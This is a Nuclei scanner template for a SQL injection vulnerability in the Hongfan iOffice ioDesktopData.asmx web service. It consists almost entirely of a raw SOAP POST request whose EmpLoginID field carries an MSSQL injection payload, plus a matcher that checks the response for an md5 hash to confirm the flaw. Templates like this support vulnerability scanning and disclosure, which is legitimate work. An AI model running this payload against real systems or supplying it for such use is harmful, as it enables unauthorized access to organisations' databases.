pocs/nuclei/ioffice-ioDesktopData-sqli.yaml

id: ioffice-ioDesktopData-sqli
info:
  name: 红帆iOffice ioDesktopData.asmx接口存在SQL注入漏洞
  author: apple
  severity: high
  description: 1
  reference:
    - https://github.com/dioos886/2024-POC/blob/main/%E7%BA%A2%E5%B8%86iOffice%20ioDesktopData.asmx%E6%8E%A5%E5%8F%A3%E5%AD%98%E5%9C%A8SQL%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E.md
  tags: tags
http:
  - raw:
      - |-
        POST /iOffice/prg/set/wss/ioDesktopData.asmx HTTP/1.1
        Content-Type: text/xml;charset=UTF-8
        Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
        User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36
        Accept-Language: zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3
        Accept-Encoding: gzip, deflate
        Upgrade-Insecure-Requests: 1
        Host: {{Hostname}}
        Content-Length: 507
        Connection: close

        <soap:Envelope xmlns:soap="http://www.w3.org/2003/05/soap-envelope" xmlns:tem="http://tempuri.org/">
        <soap:Header/>
        <soap:Body>
        <tem:GetDepSchedule>
        <!--type: string-->
        <tem:EmpLoginID>1'+(SELECT CHAR(103)+CHAR(105)+CHAR(75)+CHAR(83) WHERE 6621=6621 AND 7795 IN (SELECT (CHAR(113)+CHAR(118)+CHAR(106)+CHAR(122)+CHAR(113)+(select sys.fn_varbintohexstr(hashbytes('md5','1')))+CHAR(113)+CHAR(118)+CHAR(113)+CHAR(120)+CHAR(113))))+'</tem:EmpLoginID>
        </tem:GetDepSchedule>
        </soap:Body>
        </soap:Envelope>
    matchers:
      - type: word
        part: body
        words:
          - 'c4ca4238a0b923820dcc509a6f75849b'
